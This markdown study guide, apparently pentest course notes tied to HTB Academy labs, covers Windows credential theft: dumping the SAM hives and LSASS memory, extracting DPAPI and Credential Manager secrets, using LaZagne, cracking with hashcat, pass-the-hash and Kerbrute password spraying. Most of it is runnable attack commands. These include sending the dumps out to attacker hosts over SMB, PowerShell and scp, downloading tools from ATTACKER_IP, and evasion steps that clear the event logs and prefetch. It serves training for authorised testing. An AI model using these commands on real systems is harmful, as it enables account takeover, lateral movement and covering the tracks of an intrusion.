# Windows Password Attacks

## Overview
Windows stores password hashes in various locations that can be extracted and cracked with administrative access. This guide covers techniques for extracting and cracking Windows password hashes.

## Registry Hives

### Key Registry Locations
| Registry Hive | Location | Description |
|---------------|----------|-------------|
| **HKLM\SAM** | `C:\Windows\System32\config\SAM` | Local user password hashes |
| **HKLM\SYSTEM** | `C:\Windows\System32\config\SYSTEM` | System boot key (needed to decrypt SAM) |
| **HKLM\SECURITY** | `C:\Windows\System32\config\SECURITY` | LSA secrets, cached domain creds (DCC2), DPAPI keys |

### Backing Up Registry Hives
```cmd
# Run as Administrator
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

## File Transfer Methods

### Using Impacket SMB Server
```bash
# On attacker machine - start SMB server
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/

# On target Windows machine - transfer files
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

### Other Transfer Methods
```bash
# PowerShell download
powershell -c "(New-Object Net.WebClient).UploadFile('http://10.10.15.16:8000/sam.save', 'C:\sam.save')"

# SCP (if SSH enabled)
scp C:\sam.save user@10.10.15.16:/tmp/

# FTP
ftp 10.10.15.16
put sam.save
put system.save
put security.save
```

## Hash Extraction

### Using Impacket secretsdump
```bash
# Extract hashes from saved hives
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Example output format (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Alternative Tools
```bash
# pwdump (Windows)
pwdump.exe

# fgdump (Windows)
fgdump.exe

# Mimikatz
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

## Remote Hash Dumping

### Using NetExec (formerly CrackMapExec)
```bash
# Dump SAM hashes remotely
netexec smb 10.129.42.198 --local-auth -u bob -p password --sam

# Dump LSA secrets remotely
netexec smb 10.129.42.198 --local-auth -u bob -p password --lsa

# Dump both
netexec smb 10.129.42.198 --local-auth -u bob -p password --sam --lsa
```

### Using Impacket remotely
```bash
# Remote secretsdump
python3 secretsdump.py domain/user:password@10.129.42.198

# With hash (pass-the-hash)
python3 secretsdump.py domain/user@10.129.42.198 -hashes :nthash
```

## Hash Types and Formats

### NT Hash (NTLM)
- **Format**: 32-character hexadecimal
- **Example**: `64f12cddaa88057e06a81b54e73b949b`
- **Hashcat Mode**: 1000
- **Most common in modern Windows**

### LM Hash (Legacy)
- **Format**: 32-character hexadecimal
- **Example**: `aad3b435b51404eeaad3b435b51404ee`
- **Hashcat Mode**: 3000
- **Weak, usually disabled in modern Windows**

### DCC2 (Domain Cached Credentials)
- **Format**: `$DCC2$iterations#username#hash`
- **Example**: `$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`
- **Hashcat Mode**: 2100
- **Much slower to crack (uses PBKDF2)**

## Cracking Windows Hashes

### NT Hash Cracking
```bash
# Prepare hash file
echo "64f12cddaa88057e06a81b54e73b949b" > nthashes.txt

# Basic dictionary attack
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 1000 nthashes.txt --show
```

### DCC2 Hash Cracking
```bash
# DCC2 is much slower to crack
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

# Performance comparison:
# NT hashes: ~4,000,000 H/s
# DCC2 hashes: ~5,000 H/s (800x slower)
```

### Batch Hash Cracking
```bash
# Multiple NT hashes
cat > hashes.txt << EOF
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
EOF

# Crack all at once
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## DPAPI (Data Protection API)

### What DPAPI Protects
- **Browser passwords** (Chrome, Edge, Firefox)
- **Email passwords** (Outlook)
- **Saved RDP credentials**
- **Wireless network passwords**
- **Credential Manager entries**

### DPAPI Keys from secretsdump
```bash
# From secretsdump output
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
```

### Decrypting DPAPI Blobs
```bash
# Using Impacket dpapi
python3 dpapi.py unprotect -key 0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643 -file encrypted_blob

# Using DonPAPI (remote)
python3 DonPAPI.py domain/user:password@10.129.42.198

# Using Mimikatz
mimikatz.exe
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## LSA Secrets

### What LSA Secrets Contain
- **Service account passwords**
- **Scheduled task credentials**
- **Auto-logon passwords**
- **DPAPI machine keys**
- **Cached domain credentials**

### Extracting LSA Secrets
```bash
# From secretsdump output
[*] Dumping LSA Secrets
WS01\worker:Hello123
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
```

## LSASS Attacks

### Overview
LSASS (Local Security Authority Subsystem Service) is a core Windows process that:
- Enforces security policies
- Handles user authentication
- Stores sensitive credential material in memory
- Caches credentials from active logon sessions

### LSASS Memory Dumping Methods

#### 1. Task Manager Method (GUI Required)
```bash
# Steps:
1. Open Task Manager
2. Go to Processes tab
3. Find "Local Security Authority Process"
4. Right-click → "Create dump file"
5. File saved to %temp%\lsass.DMP
```

#### 2. Rundll32.exe & Comsvcs.dll Method
```cmd
# IMPORTANT: Run PowerShell/CMD as Administrator!
# LSASS dumping requires administrative privileges

# Find LSASS PID
tasklist /svc | findstr lsass.exe

# Or with PowerShell
Get-Process lsass

# Create dump file (replace 664 with actual PID)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\lsass.dmp full
```

#### 3. Using Procdump
```cmd
# Download Procdump from Microsoft Sysinternals
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Alternative with PID
procdump64.exe -accepteula -ma 664 lsass.dmp
```

#### 4. Using PowerShell
```powershell
# Get LSASS process
$lsass = Get-Process lsass

# Create dump using .NET
$dumpFile = "C:\lsass.dmp"
$process = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
[System.IO.File]::WriteAllBytes($dumpFile, $process.MainModule.FileName)
```

### Extracting Credentials from LSASS Dumps

#### Using Pypykatz (Linux)
```bash
# Basic extraction
pypykatz lsa minidump /path/to/lsass.dmp

# Save to file
pypykatz lsa minidump /path/to/lsass.dmp > credentials.txt

# Extract specific modules
pypykatz lsa minidump /path/to/lsass.dmp --kerberos-dir /tmp/kerberos
```

#### Using Mimikatz (Windows)
```cmd
# Load dump file
mimikatz.exe
sekurlsa::minidump lsass.dmp

# Extract credentials
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets

# Extract DPAPI keys
sekurlsa::dpapi
```

### Credential Types in LSASS

#### MSV (Microsoft Authentication Package)
```bash
# Contains:
- Username
- Domain
- NT hash
- SHA1 hash
- DPAPI keys

# Example output:
== MSV ==
Username: bob
Domain: DESKTOP-33E7O54
LM: NA
NT: 64f12cddaa88057e06a81b54e73b949b
SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
```

#### WDIGEST (Legacy Authentication)
```bash
# Contains plaintext passwords on older systems
# Windows XP - Windows 8
# Windows Server 2003 - Windows Server 2012

# Example output:
== WDIGEST ==
username: bob
domainname: DESKTOP-33E7O54
password: Password123!  # Plaintext on older systems
```

#### Kerberos (Active Directory)
```bash
# Contains:
- Kerberos tickets
- Encryption keys
- Service tickets

# Example output:
== Kerberos ==
Username: bob
Domain: DESKTOP-33E7O54
Password: Password123!
```

#### DPAPI (Data Protection API)
```bash
# Contains:
- Master keys
- Key GUIDs
- Encryption keys for protected data

# Example output:
== DPAPI ==
luid: 1354633
key_guid: 3e1d1091-b792-45df-ab8e-c66af044d69b
masterkey: e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
```

### Live Memory Extraction

#### Using Mimikatz (Direct)
```cmd
# Run on target system
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Extract specific authentication packages
sekurlsa::msv
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::dpapi
```

#### Using PowerShell Empire
```powershell
# Load Mimikatz module
Invoke-Mimikatz -Command "privilege::debug"
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

### Remote LSASS Attacks

#### Using NetExec
```bash
# Dump LSASS remotely
netexec smb 10.129.42.198 -u user -p password --lsa

# Combine with other dumps
netexec smb 10.129.42.198 -u user -p password --sam --lsa
```

#### Using Impacket
```bash
# Remote secretsdump (includes LSASS)
python3 secretsdump.py domain/user:password@10.129.42.198

# Specific LSASS dump
python3 secretsdump.py domain/user:password@10.129.42.198 -outputfile lsass_dump
```

### Cracking Extracted Credentials

#### NT Hashes from LSASS
```bash
# Extract NT hashes from pypykatz output
grep "NT:" credentials.txt | cut -d: -f2 | sort -u > nt_hashes.txt

# Crack with hashcat
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# Example:
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Defense Evasion for LSASS

#### Avoiding Detection
```bash
# Use legitimate tools
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Alternative dump locations
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\users\public\documents\lsass.dmp full

# Use task scheduler
schtasks /create /tn "SystemDump" /tr "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\temp\lsass.dmp full" /sc once /st 00:00
```

#### Cleanup
```cmd
# Remove dump files
del C:\lsass.dmp
del C:\temp\lsass.dmp

# Clear prefetch
del C:\Windows\Prefetch\RUNDLL32.EXE-*
del C:\Windows\Prefetch\PROCDUMP*.pf
```

### Common Issues and Solutions

#### Access Denied
```bash
# Ensure admin privileges
whoami /priv | findstr SeDebugPrivilege

# Run as SYSTEM
psexec.exe -i -s cmd.exe

# Enable debug privilege
mimikatz.exe
privilege::debug
```

#### Antivirus Detection
```bash
# Use legitimate Microsoft tools
procdump64.exe (signed by Microsoft)

# Alternative methods
- Task Manager (GUI)
- Process Explorer
- WinDbg
- Visual Studio diagnostics
```

#### Large Dump Files
```bash
# Compress before transfer
7z a lsass.7z lsass.dmp

# Split large files
split -b 50M lsass.dmp lsass_part_

# Transfer in chunks
for file in lsass_part_*; do scp $file user@attacker:/tmp/; done
```

### Practical LSASS Attack Workflow

#### Complete Example: Task Manager Method
```bash
# 1. Connect to target via RDP
xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!

# 2. On target - Use Task Manager (Run as Administrator)
# - Open Task Manager (Ctrl+Shift+Esc)
# - Processes tab → Find "Local Security Authority Process"
# - Right-click → "Create dump file"
# - File saved to: C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP

# 3. On attacker - Start SMB server
sudo impacket-smbserver -smb2support CompData /home/kabaneridev/Documents/hackthebox/tmpdir

# Expected output:
# [*] Config file parsed
# [*] Incoming connection (10.129.202.149,49675)
# [*] User FS01\htb-student authenticated successfully
# [*] Connecting Share(1:CompData)

# 4. On target - Transfer dump file (try different methods)
# Method 1: Full path
move "C:\Users\htb-student\AppData\Local\Temp\lsass.DMP" \\attacker-ip\CompData

# Method 2: Change directory first
cd C:\Users\htb-student\AppData\Local\Temp
move lsass.DMP \\attacker-ip\CompData

# Method 3: Use copy instead of move
copy "C:\Users\htb-student\AppData\Local\Temp\lsass.DMP" \\attacker-ip\CompData

# 5. On attacker - Extract credentials
pypykatz lsa minidump ./lsass.DMP

# 6. Extract NT hash from output
# Look for lines like: NT: 31f87811133bc6aaa75a536e77f64314

# 7. Crack NT hash
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt

# 8. Get plaintext password from hashcat output

# Troubleshooting Transfer Issues:
# If "Access is denied":
# - Run cmd as Administrator
# - Check file exists: dir C:\Users\htb-student\AppData\Local\Temp\lsass.DMP
# - Check SMB connection: dir \\attacker-ip\CompData
# - Try copy instead of move
# - Use quotes around paths with spaces
```

#### Command-line Method Workflow

#### 1. Enumerate Running Processes
```cmd
# Find LSASS PID
tasklist /svc | findstr lsass
Get-Process lsass
```

#### 2. Create Memory Dump
```cmd
# Choose method based on environment
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

#### 3. Transfer Dump File
```bash
# Start SMB server
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /tmp/

# Transfer from target
move C:\lsass.dmp \\attacker-ip\share\
```

#### 4. Extract Credentials
```bash
# Use pypykatz
pypykatz lsa minidump lsass.dmp > credentials.txt

# Parse output
grep "NT:" credentials.txt | cut -d: -f2 > nt_hashes.txt
grep "password:" credentials.txt | grep -v "None" > plaintext_passwords.txt
```

#### 5. Crack or Use Hashes
```bash
# Crack NT hashes
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# Or use for Pass-the-Hash
netexec smb targets.txt -u username -H nt_hash
```

## Advanced Techniques

### Pass-the-Hash
```bash
# Use NT hash directly (no cracking needed)
netexec smb 10.129.42.198 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Evil-WinRM with hash
evil-winrm -i 10.129.42.198 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket psexec with hash
python3 psexec.py administrator@10.129.42.198 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### Memory Dumping (Legacy)
```bash
# Dump LSASS memory
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Extract from memory dump
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## Practical Workflow

### 1. Gain Administrative Access
```bash
# Verify admin access
whoami /groups | findstr "S-1-5-32-544"

# Or check with NetExec
netexec smb target -u user -p password --local-auth
```

### 2. Extract Registry Hives
```cmd
# Save hives to temp location
reg.exe save hklm\sam C:\temp\sam.save
reg.exe save hklm\system C:\temp\system.save
reg.exe save hklm\security C:\temp\security.save
```

### 3. Transfer Files
```bash
# Start SMB server on attacker
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /tmp/

# Transfer from target
move C:\temp\*.save \\attacker-ip\share\
```

### 4. Extract Hashes
```bash
# Use secretsdump
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > hashes.txt
```

### 5. Crack Hashes
```bash
# Extract NT hashes
grep ":::" hashes.txt | cut -d: -f4 > nthashes.txt

# Crack with hashcat
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Defense Evasion

### Avoiding Detection
```bash
# Use living-off-the-land binaries
reg.exe save hklm\sam C:\windows\temp\sam.save

# Clear event logs
wevtutil.exe cl Security
wevtutil.exe cl System

# Use alternative locations
reg.exe save hklm\sam C:\users\public\sam.save
```

### Cleanup
```cmd
# Remove saved hives
del C:\temp\sam.save
del C:\temp\system.save
del C:\temp\security.save

# Clear command history
doskey /history > nul
```

## Common Issues and Solutions

### Access Denied
```bash
# Ensure you have admin rights
net user %username% | findstr "Local Group Memberships"

# Run as SYSTEM
psexec.exe -i -s cmd.exe
```

### Large Hash Files
```bash
# Split large hash files
split -l 1000 hashes.txt hash_part_

# Crack in parallel
hashcat -m 1000 hash_part_aa wordlist.txt &
hashcat -m 1000 hash_part_ab wordlist.txt &
```

### Slow Cracking
```bash
# Use mask attacks for known patterns
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d

# Use rules for common patterns
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

## Hash Identification
```bash
# NT hash: 32 hex chars
# Example: 64f12cddaa88057e06a81b54e73b949b

# LM hash: 32 hex chars (often aad3b435b51404eeaad3b435b51404ee for empty)
# Example: aad3b435b51404eeaad3b435b51404ee

# DCC2: $DCC2$ prefix
# Example: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

## Windows Credential Manager Attacks

### Overview
Windows Credential Manager stores encrypted credentials in special folders:
- **%UserProfile%\AppData\Local\Microsoft\Vault\**
- **%UserProfile%\AppData\Local\Microsoft\Credentials\**
- **%UserProfile%\AppData\Roaming\Microsoft\Vault\**
- **%ProgramData%\Microsoft\Vault\**
- **%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\**

### Credential Types
| Type | Description |
|------|-------------|
| **Web Credentials** | Website passwords, online accounts (IE, legacy Edge) |
| **Windows Credentials** | Domain users, OneDrive, network resources, services |

### Enumerating Stored Credentials
```cmd
# List stored credentials
cmdkey /list

# Expected output format:
# Target: Domain:interactive=SRV01\mcharles
# Type: Domain Password
# User: SRV01\mcharles
# Local machine persistence
```

### Using Stored Credentials
```cmd
# Impersonate user with stored credentials
runas /savecred /user:SRV01\mcharles cmd

# This works if credentials are stored with "Local machine persistence"
```

### Extracting Credentials with Mimikatz
```cmd
# Run mimikatz as administrator
mimikatz.exe

# Enable debug privileges
privilege::debug

# Extract credentials from LSASS
sekurlsa::credman

# Expected output:
# Authentication Id : 0 ; 630472
# User Name         : mcharles
# Domain            : SRV01
# credman :
#  [00000000]
#  * Username : mcharles@inlanefreight.local
#  * Domain   : onedrive.live.com
#  * Password : [PLAINTEXT PASSWORD]
```

### Alternative Tools
```bash
# Other credential extraction tools
# SharpDPAPI - C# tool for DPAPI attacks
# LaZagne - Multi-platform credential recovery
# DonPAPI - Remote DPAPI attacks
```

## LaZagne - Multi-Platform Password Recovery

### Overview
LaZagne is an open-source application used to retrieve passwords stored on a local computer. It can extract passwords from various software including browsers, email clients, databases, WiFi, and more.

### Key Features
- **Multi-platform support** (Windows, Linux, macOS)
- **60+ software modules** for password extraction
- **Standalone executable** - no installation required
- **Comprehensive reporting** with found credentials
- **Silent operation** possible

### Installation
```bash
# Download latest release
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe

# Or clone and build from source
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip install -r requirements.txt
```

### Basic Usage
```cmd
# Run all modules
LaZagne.exe all

# Run specific module
LaZagne.exe browsers

# Verbose output
LaZagne.exe all -v

# Save to file
LaZagne.exe all -oN output.txt

# Quiet mode (no output to console)
LaZagne.exe all -quiet
```

### Supported Software Categories

#### Browsers
- Chrome, Firefox, Internet Explorer, Edge
- Opera, Safari, SeaMonkey
- UC Browser, Chromium-based browsers

#### Email Clients
- Outlook, Thunderbird
- Windows Mail, Mailbird

#### Chat Applications
- Pidgin, Psi, Skype
- Jitsi, IceChat

#### Databases
- SQLite, MySQL, PostgreSQL
- MongoDB, CouchDB

#### FTP Clients
- FileZilla, WinSCP, FlashFXP
- SmartFTP, FTPNavigator

#### System Credentials
- Windows Credential Manager
- LSA Secrets, Autologon
- IIS Application Pool

### HTB Academy Scenario Walkthrough

#### Scenario Setup
```bash
# Target: Windows machine with saved credentials
# Access: RDP session as sadams
# Goal: Extract mcharles credentials
```

#### Step 1: Initial Enumeration
```cmd
# Check current user context
whoami
# Output: srv01\sadams

# Enumerate stored credentials
cmdkey /list
# Output shows: Target: Domain:interactive=SRV01\mcharles
```

#### Step 2: Privilege Escalation
```cmd
# Use saved credentials to impersonate mcharles
runas /savecred /user:SRV01\mcharles cmd

# Verify new context in new command window
whoami
# Output: srv01\mcharles
```

#### Step 3: LaZagne Deployment
```bash
# On attacker machine - setup web server
mkdir www && cd www
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
python3 -m http.server 8000
```

```cmd
# On target machine (as mcharles) - download LaZagne
certutil -urlcache -split -f "http://ATTACKER_IP:8000/LaZagne.exe" C:\Windows\Temp\lazagne.exe
```

#### Step 4: Credential Extraction
```cmd
# Run LaZagne with all modules
C:\Windows\Temp\lazagne.exe all

# Expected output format:
# |====================================================================|
# |                        The LaZagne Project                         |
# |                          ! BANG BANG !                             |
# |====================================================================|
# 
# ########## User: mcharles ##########
# 
# ------------------- Credman passwords -----------------
# [+] Password found !!!
# URL: onedrive.live.com
# Login: mcharles@inlanefreight.local
# Password: [EXTRACTED_PASSWORD]
```

### LaZagne Modules

#### Common Modules
```cmd
# Browser passwords
LaZagne.exe browsers

# System credentials  
LaZagne.exe sysadmin

# Memory dumps
LaZagne.exe memory

# WiFi passwords
LaZagne.exe wifi

# Chat applications
LaZagne.exe chats

# Databases
LaZagne.exe databases
```

#### Module-Specific Examples
```cmd
# Chrome passwords only
LaZagne.exe browsers -chrome

# Windows Credential Manager only
LaZagne.exe sysadmin -credman

# Multiple specific modules
LaZagne.exe browsers chats sysadmin
```

### Output Formats

#### Console Output
```bash
########## User: username ##########

------------------- Chrome passwords -----------------
[+] Password found !!!
URL: https://example.com
Login: user@example.com  
Password: MySecretPassword123

[+] 1 passwords have been found.
```

#### JSON Output
```cmd
# Export as JSON
LaZagne.exe all -oJ output.json

# JSON structure:
{
  "User": "username",
  "Chrome": [
    {
      "URL": "https://example.com",
      "Login": "user@example.com",
      "Password": "MySecretPassword123"
    }
  ]
}
```

### Advanced Usage

#### Silent Mode with Output
```cmd
# Run silently and save to file
LaZagne.exe all -quiet -oN credentials.txt

# Check results
type credentials.txt
```

#### Specific Categories
```cmd
# Only extract browser and email passwords
LaZagne.exe browsers mails

# Only system-level credentials
LaZagne.exe sysadmin memory
```

#### Remote Deployment
```powershell
# PowerShell download and execute
$url = "http://attacker:8000/LaZagne.exe"
$output = "C:\temp\lazagne.exe"
Invoke-WebRequest -Uri $url -OutFile $output
& $output all -quiet -oN C:\temp\creds.txt
```

### Detection and Evasion

#### Common Detections
- **Antivirus signatures** - LaZagne often flagged as malicious
- **Behavioral analysis** - Multiple password extraction attempts
- **Process monitoring** - Unusual file access patterns

#### Evasion Techniques
```bash
# Compile from source with modifications
# Use custom packer/crypter
# Deploy through legitimate file transfer
# Use process hollowing/injection
```

### Defense Against LaZagne

#### Preventive Measures
- **Don't save passwords** in browsers/applications
- **Use password managers** with strong encryption
- **Enable Credential Guard** on Windows 10/11
- **Regular security awareness training**

#### Detection Methods
- **Monitor for LaZagne signatures** in AV/EDR
- **Process monitoring** for credential access patterns
- **File integrity monitoring** for credential stores
- **Network monitoring** for C2 traffic

### LaZagne vs Other Tools

| Tool | Platform | Coverage | Stealth | Ease of Use |
|------|----------|----------|---------|-------------|
| **LaZagne** | Multi | High | Low | High |
| **Mimikatz** | Windows | High | Low | Medium |
| **SharpChrome** | Windows | Chrome only | Medium | Medium |
| **HackBrowserData** | Multi | Browsers only | Medium | High |

### Manual Credential Hunting

### Manual Credential Export
```cmd
# Open Credential Manager GUI
rundll32 keymgr.dll,KRShowKeyMgr

# Export credentials to .crd file (password-protected)
# Can be imported on other Windows systems
```

### Common Credential Targets
- **OneDrive** - Microsoft account credentials
- **Domain accounts** - Cached domain user passwords
- **Network resources** - UNC paths, shared folders
- **VPN connections** - Saved VPN credentials
- **RDP connections** - Saved RDP passwords
- **Web applications** - Browser-saved passwords

### Credential Manager Attack Workflow
```cmd
# 1. Enumerate stored credentials
cmdkey /list

# 2. Check for interesting targets
# Look for Domain:interactive entries
# Look for network resource credentials

# 3. Extract credentials with Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::credman

# 4. Use extracted credentials
# For domain accounts: Use for lateral movement
# For OneDrive: Access cloud storage
# For network resources: Access shared folders
```

### Defense Considerations
- **Credential Guard** - Protects DPAPI master keys in secure enclaves
- **DPAPI protection** - Credentials encrypted with user-specific keys
- **AES encryption** - Policy.vpol files use AES-128/256
- **Virtualization-based Security** - Modern Windows protection

## Tools Summary

### Extraction Tools
- **reg.exe** - Windows registry export
- **secretsdump.py** - Impacket hash extraction
- **NetExec** - Remote hash dumping
- **Mimikatz** - Memory and registry dumping
- **cmdkey** - Credential Manager enumeration
- **LaZagne** - Multi-platform password recovery
- **Kerbrute** - Kerberos username enumeration and password attacks

### Cracking Tools
- **Hashcat** - GPU-accelerated cracking
- **John the Ripper** - CPU-based cracking
- **Rainbow tables** - Pre-computed hash lookups

### Transfer Tools
- **smbserver.py** - Impacket SMB server
- **PowerShell** - Native Windows transfer
- **certutil** - Windows certificate utility (can download files)

## Kerbrute - Kerberos Pre-Authentication Attack Tool

### Overview
Kerbrute is a tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. It's much faster than traditional password attacks and potentially stealthier since pre-authentication failures don't trigger the standard "An account failed to log on" event 4625.

### Key Features
- **Fast enumeration** - Single UDP frame to KDC (Domain Controller)
- **Username enumeration** - No login failures, no account lockouts
- **Password spraying** - Test single password against user list
- **Brute force attacks** - Traditional password attacks
- **Multithreaded** - 10 threads by default (configurable)

### Installation

#### Pre-compiled Binaries
```bash
# Download from GitHub releases
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
```

#### Compile from Source (ARM64/M1 Mac)
```bash
# Install Go if not present
sudo apt update && sudo apt install golang-go

# Clone and compile for ARM64
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build -ldflags "-s -w" .

# Verify it works
./kerbrute --help
```

#### Docker Alternative (x86_64 emulation)
```bash
# Use x86_64 container for compatibility
docker run --rm -it --platform linux/amd64 golang:alpine sh
# Inside container:
apk add git
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute && go build .
```

### Basic Usage

#### Username Enumeration (Safest)
```bash
# Basic user enumeration
./kerbrute userenum -d domain.local usernames.txt --dc 10.10.10.10

# Verbose output
./kerbrute userenum -d domain.local usernames.txt --dc 10.10.10.10 -v

# Save output to file
./kerbrute userenum -d domain.local usernames.txt --dc 10.10.10.10 -o valid_users.txt

# Example output:
# [+] VALID USERNAME: administrator@domain.local
# [+] VALID USERNAME: jdoe@domain.local
# [+] VALID USERNAME: svc_backup@domain.local
```

#### Password Spraying (Careful - Can Lock Accounts!)
```bash
# Single password against user list
./kerbrute passwordspray -d domain.local users.txt Password123

# With domain controller specified
./kerbrute passwordspray -d domain.local users.txt Welcome2024! --dc 10.10.10.10

# Safe mode (abort if lockout detected)
./kerbrute passwordspray -d domain.local users.txt Password1 --safe

# Example output:
# [+] VALID LOGIN: jdoe@domain.local:Password123
# [+] VALID LOGIN: svc_backup@domain.local:Password123
```

#### Brute Force Single User (High Risk!)
```bash
# Brute force specific user
./kerbrute bruteuser -d domain.local passwords.txt administrator

# Only if you're certain about lockout policy!
./kerbrute bruteuser -d domain.local common_passwords.txt service_account --dc 10.10.10.10
```

#### Brute Force Credential Combos
```bash
# Username:password combinations from file
./kerbrute bruteforce -d domain.local combos.txt

# Read from stdin
cat combos.txt | ./kerbrute bruteforce -d domain.local -

# Format of combos.txt:
# admin:password
# user1:Password123
# svc_backup:backup123
```

### Advanced Usage

#### Thread Control
```bash
# Increase threads for faster enumeration
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 -t 50

# Single thread with delay (stealth)
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --delay 1000
```

#### Hash Capture (AS-REP Roasting)
```bash
# Capture AS-REP hashes for offline cracking
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --hash-file asrep_hashes.txt

# Then crack with hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Force Downgraded Encryption
```bash
# Use weaker encryption (sometimes bypasses detection)
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --downgrade
```

### Creating Username Lists

#### Common Username Conventions
```bash
# Based on "John Smith" - create variations
cat > usernames.txt << EOF
john.smith
j.smith
jsmith
smith.john
smithj
john_smith
jsmitha
johnsmith
john
smith
EOF
```

#### Automated Username Generation
```bash
# Use Username Anarchy for pattern generation
git clone https://github.com/urbanadventurer/username-anarchy.git
echo "John Smith" | ./username-anarchy/username-anarchy > generated_users.txt

# Or create custom script
cat > generate_users.sh << 'EOF'
#!/bin/bash
first="$1"
last="$2"
echo "${first,,}.${last,,}"        # john.smith
echo "${first:0:1}${last,,}"       # jsmith
echo "${first,,}${last,,}"         # johnsmith
echo "${last,,}.${first:0:1}"      # smith.j
echo "${last,,}${first:0:1}"       # smithj
EOF

chmod +x generate_users.sh
./generate_users.sh John Smith
```

### Attack Workflows

#### HTB Academy Scenario
```bash
# 1. Initial enumeration with common usernames
./kerbrute userenum -d inlanefreight.local common_users.txt --dc 10.129.201.57 -v

# 2. Create targeted list based on OSINT
cat > inlane_users.txt << EOF
bwilliamson
ben.williamson
williamson.ben
administrator
admin
service
backup
guest
EOF

# 3. Enumerate against domain
./kerbrute userenum -d inlanefreight.local inlane_users.txt --dc 10.129.201.57

# 4. Password spray with common passwords
./kerbrute passwordspray -d inlanefreight.local valid_users.txt Password123! --dc 10.129.201.57
```

#### PJPT Exam Strategy
```bash
# Step 1: Quick user enum with common names
./kerbrute userenum -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt --dc $DC_IP

# Step 2: Password spray with seasonal passwords
./kerbrute passwordspray -d domain.local valid_users.txt "Welcome2024!" --safe --dc $DC_IP
